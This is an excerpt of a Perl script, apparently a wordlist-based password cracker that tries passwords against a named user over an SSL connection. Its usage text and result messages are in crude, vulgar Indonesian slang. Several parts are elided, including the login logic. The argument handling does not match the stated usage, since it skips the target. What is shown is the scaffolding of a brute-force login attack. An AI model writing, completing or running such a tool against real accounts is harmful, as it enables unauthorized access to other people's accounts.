...
system('clear');
print "\nCara pakai :\n";
print "perl ngntd.pl username target wordlist\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\nKaga ada wordlistnya ajg $wordlist -_- \n";

print "\nYok langsung di eue\n";
print "Jangan lupa berdoa kalo mau ngeue\n";print "\nMemulai Crack Kntl Pada>>> $user <<<\n\n";
...
if (!defined $success)
{
print "[-] $password -> Anda Kurang Beruntung, Mungkin Kntl Anda Kurang Panjang  \n";
close SSL;
}
else
{
...
print "\n########################################################\n";
print "Selamat Sob Usaha Anda Tidak Sia Sia, Nih Passwordnya Ketemu => $password \n";
print "########################################################\n\n";
close SSL;
exit;
}
